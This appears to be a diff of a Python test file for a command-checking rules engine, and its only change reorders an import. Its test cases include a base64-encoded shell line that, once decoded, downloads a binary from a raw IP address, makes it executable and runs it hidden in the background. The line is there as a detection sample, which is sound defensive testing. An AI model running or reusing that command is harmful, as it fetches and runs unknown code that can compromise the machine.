@@ -4,7 +4,7 @@ import sys
 from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
-from rules_engine import check, StreamChecker
+from rules_engine import StreamChecker, check
 
 CASES = [
     ("base64_to_shell", 'echo "Y2xlYXIKZWNobyAiTG9hZGluZy4uLiBQbGVhc2UgV2FpdCIKY3VybCAtcyBodHRwOi8vODYuNTQuMjUuMjEzL2QvdW5peDgxMTc5MTM2ID4gL3RtcC91bml4MDAxCmNobW9kICt4IC90bXAvdW5peDAwMQovdG1wL3VuaXgwMDEgPiAvZGV2L251bGwgMj4mMSAmIGRpc293bg==" | base64 -d | bash', 2),
